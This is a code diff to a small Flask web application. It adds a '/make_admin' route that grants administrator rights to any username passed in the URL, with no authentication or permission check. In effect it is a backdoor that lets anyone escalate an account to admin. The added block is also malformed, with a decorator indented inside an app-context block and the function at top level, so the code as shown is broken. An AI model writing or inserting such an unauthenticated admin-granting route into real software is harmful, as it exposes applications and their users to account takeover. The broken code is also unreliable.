@@ -25,6 +25,16 @@ def log(name, ok):
     db.session.commit()
 with app.app_context():
     db.create_all()
+    @app.route("/make_admin")
+def make_admin():
+    user = request.args.get("user")
+    u = User.query.filter_by(username=user).first()
+    if u:
+        u.is_admin = True
+        db.session.commit()
+        return "Admin created"
+    return "User not found"
+
 
 
 @app.route("/")
@@ -117,4 +127,5 @@ def logs():
 @app.route("/uploads/<file>")
 def img(file):
     return send_from_directory("uploads", file)
+
 
